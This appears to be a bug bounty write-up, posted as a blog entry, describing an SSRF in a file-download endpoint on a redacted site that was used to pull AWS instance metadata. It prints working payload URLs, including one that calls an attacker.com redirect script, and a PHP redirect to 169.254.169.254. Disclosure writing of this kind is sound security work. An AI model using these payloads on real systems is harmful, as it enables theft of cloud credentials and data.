---
layout: post
title: AWS Metadata Disclosure via “Hardcoded Host” Download Function
excerpt: "Sometimes, when visiting a website, we find a link to download files from that site. The downloaded file can be a guide, tutorial, or another other document."
tags: [bug hunting, hacking, lfd, aws]
categories: [bug hunting]
comments: true
image:
  feature: 81591f7af4d3ec85cfb7c1d7856d9ec7-f.png
---

Sometimes, when visiting a website, we find a link to download files from that site. The downloaded file can be a guide, tutorial, or another other document.

When hunting private programs on Bugcrowd, I found a link to download PDF files with the following format:

```
https://redacted.com/download?file=/2019/08/file.pdf
```

When accessing the link, then the browser will download the file `file.pdf`. The first I think when finding such a URL, of course I wonder if there is a **Local File Download** bug on the link.

So to do the test, I tried to change the URL be like this:

```
https://redacted.com/download?file=index.php
```

But nothing happened :(

There are several possibilities that I can think when found the index.php file could not be downloaded. First, the download feature has been protected so that we cannot download files that are not permitted, or second, the download feature is directed to another host maybe as a CDN or something so that the index.php file does not exist.

For the second possibility, maybe this is the code used:

```php
$host = 'https://cdn.redacted.com';
$file = $_GET['file'];

$download_url = $host .'/'. $file;
```

In the code above, it appears that the `host` of the file to be downloaded has been hardcoded in the code, so that we can manipulate only the `file` parameter.

#### URL Redirection

To find out if our assumptions about the URL format are correct, the easiest way is to try to redirect to another domain by adding the @ symbol at the end of the `file` parameter value and followed by the domain.

Example:

```
https://redacted.com/download?file=/2019/08/file.pdf@www.google.com
```

And boom! The HTML code from _www.google.com_ was downloaded.

![www.google.com Source Code](/assets/81591f7af4d3ec85cfb7c1d7856d9ec7-1.png)

This means that through this vulnerability we can only download data that is outside the server, cannot access files that are on the target. Then what data can we possibly get?

#### AWS Metadata

Knowing that the server is on Amazon AWS, so I tried to extract AWS Metadata through the vulnerability.

AWS Metadata Exists at URL:

```
http://169.254.169.254/latest/meta-data/
```

Then the URL is modified like this:

```
https://redacted.com/download?file=/2019/08/file.pdf@169.254.169.254/latest/meta-data/
```

But nothing happened again :(

After some time, I realized that the possibility of a hardcode host using the `HTTPS` protocol, so when we try to redirect to the Metadata URL that is using the `HTTP` protocol, the redirect process doesn’t work.

For that, I use a little trick, by using a domain that uses `HTTPS` and then redirect again to the URL of the Metadata.

```
Server Target ---> HTTPS domain ---> URL Metadata
```

For that, I created a simple `PHP` file to redirect to Metadata:

```php
<?php

header('location: http://169.254.169.254/latest/meta-data/');
```

Then the file is uploaded to a domain that uses HTTPS. Then the final URL will be like this:

```
https://redacted.com/download?file=/2019/08/file.pdf@attacker.com/redirect.php
```

And the Metadata was downloaded !

![AWS Metadata](/assets/81591f7af4d3ec85cfb7c1d7856d9ec7-2.png)

For this finding, I got `P1` on Bugcrowd.

**References:**

- CWE-200 : Information Exposure
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html